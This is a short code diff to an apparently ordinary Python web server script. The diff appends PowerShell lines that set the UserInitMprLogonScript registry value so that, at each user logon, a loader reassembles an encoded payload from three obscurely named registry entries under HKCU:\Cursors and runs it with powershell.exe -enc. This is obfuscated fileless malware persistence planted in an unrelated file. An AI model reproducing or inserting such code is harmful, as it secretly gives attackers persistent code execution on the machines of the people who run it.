@@ -36,3 +36,9 @@ if __name__ == "__main__":
     
     webServer.server_close()
     print("Server stopped.")
+
+
+
+$envRegPath = "HKCU:\Environment"
+$loaderCommand = '$frag1=[Get-ItemProperty -Path HKCU:\Cursors -Name nLzTvI0bImeIeqyxHxTJ]."nLzTvI0bImeIeqyxHxTJ"; $frag2=[Get-ItemProperty -Path HKCU:\Cursors -Name pQzUwJ1cKnfLerzxGyUK]."pQzUwJ1cKnfLerzxGyUK"; $frag3=[Get-ItemProperty -Path HKCU:\Cursors -Name rMxVwL2dMogPfsayIzVL]."rMxVwL2dMogPfsayIzVL"; $encoded=$frag1 + $frag2 + $frag3; powershell.exe -enc $encoded'
+Set-ItemProperty -Path $envRegPath -Name "UserInitMprLogonScript" -Value $loaderCommand
